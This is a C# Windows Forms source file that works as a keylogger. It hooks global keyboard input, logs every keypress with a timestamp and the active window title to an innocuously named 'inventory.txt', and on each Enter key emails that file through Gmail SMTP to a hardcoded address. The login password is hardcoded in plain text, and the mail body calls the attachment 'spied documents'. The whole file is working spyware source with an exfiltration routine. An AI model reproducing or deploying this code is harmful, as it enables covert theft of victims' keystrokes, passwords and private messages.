using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
//Para manejo de archivo
using System.IO;
//Para correo
using System.Net.Mail;

namespace Pruebas
{
    public partial class Test : Form
    {  //ultima version
        private int y = 0;
        private int velocity = 5;
        private int x = 0;
        private WQLUtil.Util.Window.WindowManager w;
        private WQLUtil.Util.Mouse.MouseManager m;
        private const string FILE_NAME = "Test.data";
        public String KeyLog2 = "";
        public FileStream stream;
        public StreamWriter writer;
        public StreamWriter escribir;
        public bool VtnActiva, band;
        public Test(String KeyLog3)
        {
            InitializeComponent();
            //w = new WQLUtil.Util.Window.WindowManager(WinEventProc);
            m = new WQLUtil.Util.Mouse.MouseManager();
            this.KeyLog2 = KeyLog3;
            m.Hook.OnMouseActivity += new MouseEventHandler(MouseMoved);
            m.Hook.KeyDown += new KeyEventHandler(ExtKeyDown);
            m.Hook.KeyPress += new KeyPressEventHandler(ExtKeyPress);
            m.Hook.KeyUp += new KeyEventHandler(ExtKeyUp);
            try
            {
                using (var escribir = File.AppendText("inventory.txt"))
                {
                    escribir.WriteLine(KeyLog2 + " --  \n");
                }
            }

            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
        }

        private void Log(string txt)
        {
            //  Console.WriteLine("{0}", txt);
        }
        public void EnviarCorreo()
        {
            try
            {
                MailMessage mail = new MailMessage();
                SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");

                mail.From = new MailAddress("funseguridad@gmail.com");
                mail.To.Add("funseguridad@gmail.com");
                mail.Subject = "Importante!";

                mail.Body = "Enviando archivo de documentos espiados";
                System.Net.Mail.Attachment attachment;
                attachment = new System.Net.Mail.Attachment("inventory.txt");
                mail.Attachments.Add(attachment);
                SmtpServer.Port = 587;

                SmtpServer.DeliveryMethod = SmtpDeliveryMethod.Network;
                //SmtpServer.UseDefaultCredentials = false;
                String pass = "123EjemplO";
                SmtpServer.Credentials = new System.Net.NetworkCredential("funseguridad@gmail.com", pass);
                SmtpServer.EnableSsl = true;
                SmtpServer.Send(mail);
                //   MessageBox.Show("mail Send");
                mail.Attachments.Dispose();
                // Console.WriteLine("termino correo");
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }

        public void MouseMoved(object sender, MouseEventArgs e)
        {
        }

        public void ExtKeyDown(object sender, KeyEventArgs e)
        {
        }

        public void ExtKeyPress(object sender, KeyPressEventArgs e)
        {
            DateTime current = DateTime.Now;
            string date = current.ToUniversalTime().ToString();
            date = date.Replace(':', '_');
            date = date.Replace('/', '_');
            try
            {
                using (var escribir = File.AppendText("inventory.txt"))
                {
                    escribir.WriteLine(date + " Key - " + e.KeyChar);
                    escribir.WriteLine(date +  " "+ WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle());
                    //escribir.WriteLine();
                }
            }

            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
        }

        public void ExtKeyUp(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
            {
                //int X = Cursor.Position.X;
                //int Y = Cursor.Position.Y;
                //escribir.WriteLine(" " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle());
                EnviarCorreo();
            }

        }

        public void WinEventProc(IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            //   Log("Ventana activa - " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
            try
            {
                using (var escribir = File.AppendText("inventory.txt"))
                {
                    escribir.WriteLine("Ventana Activa: " + WQLUtil.Util.Window.WindowManager.GetActiveWindowTitle() + "\r\n");
                }
            }

            catch (Exception ee)
            {
                Console.WriteLine(ee.Message);
            }
        }

        public string getLog2()
        {
            return KeyLog2;
        }



        private void Test_Load(object sender, EventArgs e)
        {
        }

        private void Test_FormClosed(object sender, FormClosedEventArgs e)
        {
        }

        private void Test_FormClosing(object sender, FormClosingEventArgs e)
        {
        }
    }
}
